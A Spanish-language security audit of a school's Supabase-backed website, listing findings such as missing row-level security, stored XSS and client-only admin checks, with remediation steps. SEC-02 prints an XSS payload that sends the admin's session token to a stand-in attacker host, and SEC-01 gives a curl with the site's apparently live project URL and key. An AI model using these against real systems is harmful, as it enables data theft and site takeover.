# Informe de seguridad — Sitio institucional IES N° 11

- **Alcance:** repositorio `PAGINA-INSTITUCIONAL-IES11`, rama `main`, commit `69bdcbd`.
- **Rama de trabajo:** `qa/auditoria-seguridad`.
- **Fecha:** 2026-11-14.
- **Metodología:** revisión estática de código (SAST manual) + verificación dinámica **de solo lectura** contra la API pública de Supabase. No se ejecutaron pruebas destructivas ni se modificaron datos.
- **Fuera de alcance:** infraestructura de hosting, DNS, correo, supabase-js interno y ataques de denegación de servicio.

## Resumen ejecutivo

El sitio es una aplicación estática que habla **directamente con Supabase desde el navegador**. Ese diseño es válido solo si las políticas **Row Level Security (RLS)** están bien configuradas, porque la clave pública (`sb_publishable_...`) que viaja en el JavaScript es equivalente a la antigua *anon key*: no es un secreto, y todo el control de acceso debe vivir en la base.

La verificación confirmó que **RLS no está protegiendo los datos**: con la clave publicada en el sitio, un visitante anónimo pudo leer, actualizar y borrar registros en `mensajes_contacto`, `carreras`, `noticias` y `agenda`. Esto permite fuga de datos personales del formulario de contacto y la destrucción/defacement total del contenido institucional sin iniciar sesión.

A esto se suma un **XSS almacenado** que convierte el formulario público de contacto en un vector para ejecutar código en el navegador del administrador, y un control de acceso del panel que es **solo del lado del cliente** (se evita desactivando JavaScript o llamando la API directamente).

| Severidad | Cantidad |
|---|---|
| Crítico | 3 |
| Alto | 5 |
| Medio | 5 |
| Bajo | 4 |

---

## Hallazgos

### SEC-01 — RLS ausente: la clave pública permite leer, modificar y borrar datos (CRÍTICO)

**Evidencia**

- `assets/supabaseClient.js:2-6` y `admin/js/login.js:2-4` publican URL y clave de Supabase.
- Pruebas de solo lectura contra la API:

| Tabla | `SELECT` anónimo | `UPDATE` anónimo (filtro sin coincidencias) | `DELETE` anónimo (filtro sin coincidencias) |
|---|---|---|---|
| `mensajes_contacto` | `200` (1 fila visible) | `200` | `200` |
| `carreras` | `200` | `200` | `200` |
| `noticias` | `200` | `200` | `200` |
| `agenda` | `200` | `200` | `200` |

Ejemplo de petición que devolvió datos sin autenticación:

```
GET /rest/v1/mensajes_contacto?select=id&limit=1
apikey: sb_publishable_-lAeJuIOfnpOeA8ixU2fEQ_Jqy0lLU1
→ 200  [{"id":1}]     (Content-Range: 0-0/1)
```

**Impacto**

- Fuga de datos personales: nombre, email, teléfono, asunto y mensaje de cada consulta enviada por el público.
- Alteración o borrado de carreras, noticias y agenda: defacement y pérdida de información institucional.
- No se requieren credenciales: la clave está en el código fuente público.

**Reproducción (segura, sin modificar datos)**

```bash
curl -s "https://smoizmmrkhdgrirfcynu.supabase.co/rest/v1/mensajes_contacto?select=id&limit=1" \
  -H "apikey: sb_publishable_-lAeJuIOfnpOeA8ixU2fEQ_Jqy0lLU1"
```

**Remediación**

1. Aplicar [`sql/hardening-rls.sql`](./sql/hardening-rls.sql) en un entorno de staging y luego en producción.
2. Mínimo indispensable: `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` en **todas** las tablas del esquema `public`.
3. Lectura pública solo para contenido institucional (`carreras`, `noticias`, `agenda`).
4. `INSERT` anónimo solo en `mensajes_contacto`; nada de `SELECT/UPDATE/DELETE` anónimo sobre esa tabla.
5. Escritura solo para usuarios con rol `admin` (custom claim en `app_metadata`), no para cualquier usuario autenticado.
6. Revocar privilegios directos como segunda capa: `REVOKE UPDATE, DELETE ON public.mensajes_contacto FROM anon;`.
7. Verificar también las políticas del bucket de Storage `archivos`.

---

### SEC-02 — XSS almacenado en el panel admin a través del formulario público (CRÍTICO)

**Evidencia**

- `js/script.js:479-485` inserta sin sanitizar los campos del formulario público.
- `admin/js/contacto-management.js:53-70` renderiza esos valores con `innerHTML` (nombre, email, asunto, teléfono).
- `admin/js/index.js:72-86` hace lo mismo en el dashboard de mensajes recientes.
- `admin/js/contacto-management.js:110` usa `alert()` concatenando los mismos campos.

**Impacto**

Cualquier visitante puede enviar una consulta con un payload, por ejemplo:

```html
<img src=x onerror="fetch('https://atacante.example/?t='+localStorage.getItem('sb-smoizmmrkhdgrirfcynu-auth-token'))">
```

Cuando el administrador abre el panel, el código se ejecuta en su sesión: puede robar el token de Supabase (guardado en `localStorage`), actuar como admin y vaciar o modificar el sitio. Se combina con SEC-01 y SEC-03 y escala a **toma de control total**.

**Remediación**

- Renderizar con `textContent` / `createElement`, nunca `innerHTML` con datos de usuario o base de datos.
- Si se necesita HTML, sanitizar con DOMPurify en el cliente y validar/sanear en el servidor (Edge Function) antes de guardar.
- Escapar atributos (`href`, `src`, `data-*`); validar que URLs sean `https:` y no `javascript:`.
- Agregar CSP estricta (ver SEC-05) como mitigación de defensa en profundidad.
- Limpiar los registros ya almacenados que contengan HTML.

---

### SEC-03 — Autorización del panel admin solo del lado del cliente (CRÍTICO)

**Evidencia**

- `admin/js/admin-auth.js:6-30`: si `getSession()` no devuelve sesión, redirige a `login.html`. No hay verificación de rol ni de permisos.
- Todas las páginas `admin/*.html` son estáticas y públicas; el HTML y el JS se descargan sin autenticación.
- Las operaciones de escritura se hacen con la misma clave pública (`admin/js/*-management.js`).

**Impacto**

La redirección es cosmética: se evade deshabilitando JavaScript, con `curl`, o llamando la API de Supabase directamente. La única barrera real es RLS (SEC-01), que hoy no existe.

**Remediación**

- Considerar el panel como no confiable: toda autorización debe aplicarse en la base (RLS + rol admin).
- Opcional: mover operaciones administrativas a Supabase Edge Functions con `service_role` y verificación de JWT/rol.
- Validar el rol al cargar cada módulo y ante cada operación, no solo la existencia de sesión.

---

### SEC-04 — XSS en el chatbot público: entrada del usuario y respuesta de la IA se pintan como HTML (ALTO)

**Evidencia**

- `js/chatbot.js:154`: `msgDiv.innerHTML = texto;`
- `js/chatbot.js:231`: se envía el texto del usuario a `agregarMensaje` → `innerHTML`.
- `js/chatbot.js:240-242`: la respuesta del modelo o del respaldo local también se asigna con `innerHTML`.

**Impacto**

- Auto-XSS: el propio usuario ejecuta el payload que escribe.
- Inyección remota: la salida del modelo se interpreta como HTML; un *prompt injection* podría devolver `<img onerror=...>`. Además, los nombres de carreras provenientes de Supabase se interpolan sin escapar (`js/chatbot.js:86-88`).

**Remediación**

- Usar `textContent` para mensajes del usuario.
- Para las respuestas del bot, permitir un subconjunto de etiquetas con DOMPurify (`ALLOWED_TAGS: ['b','br','a','strong','em']`).
- Escapar los datos de `carreras` antes de construir HTML.
- CSP que bloquee scripts inline y orígenes no confiables.

---

### SEC-05 — Ausencia de CSP y cabeceras de seguridad; CDN sin Subresource Integrity (ALTO)

**Evidencia**

- No hay `<meta http-equiv="Content-Security-Policy">` ni configuración de cabeceras en el repo.
- `@supabase/supabase-js@2` se carga desde jsDelivr con versión flotante y sin `integrity` (p. ej. `index.html:311`, `admin/index.html:117`).
- FontAwesome y Google Fonts también se cargan desde CDN externos.

**Impacto**

- Sin CSP, cualquier XSS (SEC-02/SEC-04) se explota sin fricción.
- Un compromiso del CDN o un cambio de versión mayor puede inyectar código en el sitio.

**Remediación**

- Definir CSP (idealmente por cabecera HTTP en el hosting; si no, `<meta>`): `default-src 'self'`, `script-src 'self' https://cdn.jsdelivr.net`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`.
- Fijar versión exacta de supabase-js y agregar `integrity` + `crossorigin="anonymous"`.
- Sumar `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` y HSTS si se sirve por HTTPS.

---

### SEC-06 — Login sin límite de intentos y errores verbosos (ALTO)

**Evidencia**

- `admin/js/login.js:18-48`: no hay rate limiting, CAPTCHA ni bloqueo progresivo.
- `admin/js/login.js:35`: se muestra `error.message` de Supabase tal cual en pantalla.

**Impacto**

- Fuerza bruta / credential stuffing contra las cuentas del panel.
- Enumeración de cuentas y filtrado de detalles internos del proveedor.

**Remediación**

- Activar rate limiting en Supabase Auth (o proxy propio) y CAPTCHA (Turnstile/hCaptcha) tras varios fallos.
- Mensaje genérico: "Credenciales inválidas".
- Exigir contraseñas robustas, MFA para administradores y alertas de acceso.

---

### SEC-07 — API key de Gemini en el frontend (ALTO, latente)

**Evidencia**

- `js/chatbot.js:10`: `const GEMINI_API_KEY = '';`
- `js/chatbot.js:173`: la clave se concatena en la URL de la API desde el navegador.

**Impacto**

Hoy está vacía y el chatbot usa el respaldo local. Si se completa, la clave queda pública en el JS: cualquiera puede usarla y generar costos a nombre del instituto.

**Remediación**

- No poner claves en el cliente. Mover la llamada a una Edge Function / backend que guarde la clave como secreto y aplique cuotas, validación y rate limiting por IP/sesión.

---

### SEC-08 — Políticas del bucket `archivos` sin verificar (ALTO)

**Evidencia**

- `admin/js/novedades-management.js:108-121` y `admin/js/oferta-management.js:119-150` suben archivos al bucket `archivos` y obtienen URL pública.

**Impacto**

Si el bucket permite `INSERT` anónimo, un atacante puede alojar contenido arbitrario (malware, phishing) en el dominio del instituto. Si permite listado, puede enumerar documentos.

**Remediación**

- Lectura pública solo si es intencional; `INSERT/UPDATE/DELETE` restringidos a admin.
- Validar MIME, extensión y tamaño en el servidor (no solo en el navegador).
- Activar límites de tamaño del bucket y antivirus/escaneo si es posible.

---

### SEC-09 — Token de sesión en `localStorage` (MEDIO)

Supabase guarda la sesión en `localStorage` por defecto, accesible desde JavaScript. Cualquier XSS (SEC-02/SEC-04) permite exfiltrarla. **Remediación:** eliminar los XSS, CSP estricta, sesiones cortas y revocación; evaluar cookies `HttpOnly` mediante un backend intermedio.

---

### SEC-10 — Datos personales sin política de retención ni minimización (MEDIO)

`mensajes_contacto` almacena nombre, email, teléfono y mensaje; los módulos de estudiantes manejan DNI. No hay borrado automático, cifrado a nivel de campo ni aviso de privacidad visible. En Argentina aplica la Ley 25.326 de Protección de Datos Personales. **Remediación:** política de retención, minimización, control de acceso por rol, registro de auditoría y aviso de privacidad en el formulario.

---

### SEC-11 — `innerHTML` con datos editables en varios módulos admin (MEDIO)

- `admin/js/estudiantes-management.js:72-98`
- `admin/js/novedades-management.js:56-68`
- `admin/js/oferta-management.js:75-90`, `:204-211`
- `admin/js/agenda-management.js:45-60`
- `admin/js/index.js:72-86`

Permite XSS almacenado si un editor es comprometido o si los datos llegan por otra vía. **Remediación:** `textContent`/DOM API, sanitización y validación de URLs en `href`/`src`.

---

### SEC-12 — Duplicación de configuración de Supabase (MEDIO)

`admin/js/login.js` define su propio cliente (`dbClient`) y repite URL/clave en lugar de usar `assets/supabaseClient.js`. Facilita divergencias y dificulta rotar credenciales. **Remediación:** un único módulo de configuración y una sola instancia.

---

### SEC-13 — Formulario de contacto sin validación de servidor ni anti-spam (MEDIO)

`js/script.js:479-485` solo hace `trim()`. No hay límites de longitud, formato de email, honeypot, CAPTCHA ni rate limiting. **Impacto:** spam, payloads XSS persistidos y abuso de cuotas. **Remediación:** validar en el servidor (Edge Function o `CHECK` constraints), límites de longitud y CAPTCHA.

---

### SEC-14 — `console.log` con datos de sesión (BAJO)

`admin/js/login.js:38`: `console.log('Login exitoso:', data);`. **Remediación:** eliminar logs de producción.

### SEC-15 — Mensajes de error internos en la UI (BAJO)

`admin/js/contacto-management.js:75`, `:113`, `:129` muestran `err.message`. **Remediación:** mensaje genérico + log interno.

### SEC-16 — Código muerto (BAJO)

`js/carousel.js` y `js/filters.js` están vacíos y no se referencian. **Remediación:** eliminarlos.

### SEC-17 — `target="_blank"` sin `rel` (BAJO)

`admin/index.html:27`. **Remediación:** agregar `rel="noopener noreferrer"`.

---

## Defectos funcionales detectados durante la auditoría

| ID | Hallazgo | Evidencia |
|---|---|---|
| FUN-01 | El módulo de estudiantes está roto: las tablas `solicitudes_estudiantes` y `calendario_examenes` no existen en la API (`PGRST205`). | `admin/js/estudiantes-management.js:20-21`, `:192-193` |
| FUN-02 | El chatbot solo se carga en `index.html`; no está disponible en el resto del sitio. | `index.html:315` |
| FUN-03 | Imágenes sin optimizar (`rectora.webp` 2,6 MB, `vicerrectora.webp` 2,5 MB) y solo 3 de 18 imágenes con `loading="lazy"` → afecta LCP en móviles. | `assets/images/`, `*.html` |
| FUN-04 | Solo 3 de 8 formularios usan validación nativa (`required`). | `*.html` |
| FUN-05 | `admin-auth.js` no diferencia roles; cualquier usuario autenticado ve todos los módulos. | `admin/js/admin-auth.js` |

---

## Plan de remediación sugerido

1. **Inmediato (0-48 h):** habilitar RLS y revocar `UPDATE/DELETE` anónimos (SEC-01). Es la vulnerabilidad de mayor impacto y la más barata de cerrar.
2. **Corto plazo (1 semana):** corregir XSS de contacto y chatbot (SEC-02, SEC-04, SEC-11); sanitizar registros existentes.
3. **Corto plazo:** CSP, SRI y versión fija de supabase-js (SEC-05).
4. **Mediano plazo:** rate limiting/MFA en login (SEC-06), mover Gemini a backend (SEC-07), políticas de Storage (SEC-08).
5. **Mediano plazo:** privacidad y retención de datos (SEC-10), validación de servidor (SEC-13).

## Re-test

Después de aplicar los cambios, repetir las consultas de SEC-01: deben devolver `401/403` o `[]` para operaciones anónimas de escritura, y `SELECT` anónimo solo en las tablas públicas permitidas. Repetir también los payloads de SEC-02/SEC-04 y verificar que se muestren como texto.
